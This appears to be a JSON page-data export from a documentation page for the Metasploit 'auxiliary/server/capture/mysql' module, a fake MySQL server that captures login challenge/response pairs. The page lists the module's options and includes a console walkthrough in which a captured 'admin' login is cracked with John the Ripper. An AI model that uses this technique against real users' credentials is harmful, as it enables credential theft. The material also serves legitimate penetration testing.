{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/server/capture/mysql","result":{"data":{"moduleMetadataJson":{"id":"c63a9b0f-bb61-5c92-a7c3-cdf6874cf17c","name":"Authentication Capture: MySQL","fullname":"auxiliary/server/capture/mysql","description":"This module provides a fake MySQL service that is designed to\n        capture authentication credentials. It captures\tchallenge and\n        response pairs that can be supplied to Cain or JtR for cracking.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/server/capture/mysql","documentationSlug":"/modules/documentation/auxiliary/server/capture/mysql"},"documentation":{"html":"<p>This module creates a mock MySQL server which accepts credentials.  Upon receiving a login attempt, an <code class=\"language-text\">ERROR 1045 (2800): Access denied</code> error is thrown.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/server/capture/mysql</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>CHALLENGE</strong></p>\n<p>  The MySQL 16 byte challenge used in the authentication.  Default is <code class=\"language-text\">112233445566778899AABBCCDDEEFF1122334455</code>.</p>\n<p>  <strong>JOHNPWFILE</strong></p>\n<p>  Write a file containing a John the Ripper format for cracking the credentials.  Default is <code class=\"language-text\"></code>.</p>\n<p>  <strong>CAINPWFILE</strong></p>\n<p>  Write a file containing a Cain &#x26; Abel format for cracking the credentials.  Default is <code class=\"language-text\"></code>.</p>\n<p>  <strong>SRVVERSION</strong></p>\n<p>  The MySQL version to print in the login banner.  Default is <code class=\"language-text\">5.5.16</code>.</p>\n<p>  <strong>SSL</strong></p>\n<p>  Boolean if SSL should be used.  Default is <code class=\"language-text\">False</code>.</p>\n<p>  <strong>SSLCert</strong></p>\n<p>  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically\ngenerated.  Default is <code class=\"language-text\"></code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"mysql-with-mysql-client-and-jtr-cracking\" style=\"position:relative;\"><a href=\"#mysql-with-mysql-client-and-jtr-cracking\" aria-label=\"mysql with mysql client and jtr cracking permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MySQL with MySQL Client and JTR Cracking</h3>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/mysql \nmsf5 auxiliary(server/capture/mysql) &gt; set johnpwfile /tmp/mysql.logins\njohnpwfile =&gt; /tmp/mysql.logins\nmsf5 auxiliary(server/capture/mysql) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/mysql) &gt; \n[*] Started service listener on 0.0.0.0:3306 \n[*] Server started.\n[+] 127.0.0.1:59604 - User: admin; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 46677c2d9cac93da328c4321060c125db759925e</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Client:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:~# mysql -u admin -ppassword1 -h 127.0.0.1\nERROR 1045 (28000): Access denied for user &#39;admin&#39;@&#39;127.0.0.1&#39; (using password: YES)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>JTR:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:~# john /tmp/mysql.logins_mysqlna \nUsing default input encoding: UTF-8\nLoaded 1 password hashes with no different salts (mysqlna, MySQL Network Authentication [SHA1 32/64])\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\npassword1        (admin)\n1g 0:00:00:00 DONE 2/3 (2018-11-08 21:05) 20.00g/s 16800p/s 16800c/s 16800C/s password1\nUse the &quot;--show&quot; option to display all of the cracked passwords reliably\nSession completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c63a9b0f-bb61-5c92-a7c3-cdf6874cf17c"}}}